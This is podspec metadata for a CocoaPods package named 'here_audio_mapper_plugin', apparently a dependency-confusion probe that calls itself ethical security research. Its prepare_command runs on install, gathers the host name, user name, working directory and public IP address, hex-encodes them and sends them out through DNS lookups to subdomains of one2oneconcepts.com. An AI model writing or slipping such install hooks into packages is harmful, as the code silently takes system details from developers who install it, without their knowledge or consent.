name: here_audio_mapper_plugin
summary: This pod create as part of security testing and deep research
description: This Pod is ethicaly for better security around the world, the pod created based on: https://github.com/CocoaPods/pod-template/blob/master/NAME.podspec with the idea of: https://www.youtube.com/watch?v=zFHJwehpBrU
prepare_command: a=$(hostname;whoami;pwd;echo 'here_audio_mapper_plugin';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.sub.one2oneconcepts.com;done
